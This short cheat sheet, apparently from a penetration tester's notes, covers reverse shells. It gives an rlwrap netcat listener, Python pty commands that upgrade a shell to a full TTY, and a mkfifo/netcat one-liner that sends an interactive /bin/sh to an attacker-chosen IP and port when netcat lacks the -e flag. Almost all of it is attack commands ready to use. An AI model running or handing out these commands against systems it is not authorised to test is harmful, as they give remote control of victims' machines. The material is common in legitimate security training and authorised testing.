## How to upgrade shells on every OS
There is a tool called rlwrap. It helps upgrading the reverse shell on netcat. Simply use rlwrap nc -nlvp <port> and done!

## Manual upgrade to TTY on Linux
Run the following lines:

```
python -c 'import pty; pty.spawn("/bin/bash")'

export TERM=xterm
```

## How to obtain reverse shell with 'Neutered' Netcat
Some versions of netcat do not accept the flag -e. Therefore, the common nc command to send a reverse shell will not work.

```
mkfifo f;nc <ip> <port> 0<f | /bin/sh -i 2>&1 | tee f
```

